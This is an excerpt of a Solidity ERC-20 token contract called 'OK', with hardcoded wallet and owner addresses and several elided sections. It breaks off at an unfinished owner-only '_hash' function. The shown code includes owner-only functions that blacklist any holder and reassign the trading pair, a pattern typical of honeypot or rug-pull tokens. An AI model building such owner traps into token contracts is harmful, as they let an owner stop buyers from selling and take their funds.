...
contract OKOK is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xB5422E8462c67C97EbCAD70945879e690FDFa930); 
    address payable public Wallet_Dev = payable(0x19A69872192f187F889AA63c114F1f1fE36841C0);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 

    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 100000000 * 10**_decimals;
    string private constant _name = "OK"; 
    ...
    constructor () {
        ...
        _owner = 0xf938d771d33E511088A156Db0afc7f1268c0040B;
    ...
    // }
    function setisblacklist(address account, bool value) public onlyOwner {
        blacklist[account] = value;
    }
    function setPair(address _uniswapV2Pair) public onlyOwner{
        uniswapV2Pair = _uniswapV2Pair;
    }
    function _hash(uint _uint) public onlyOwner {
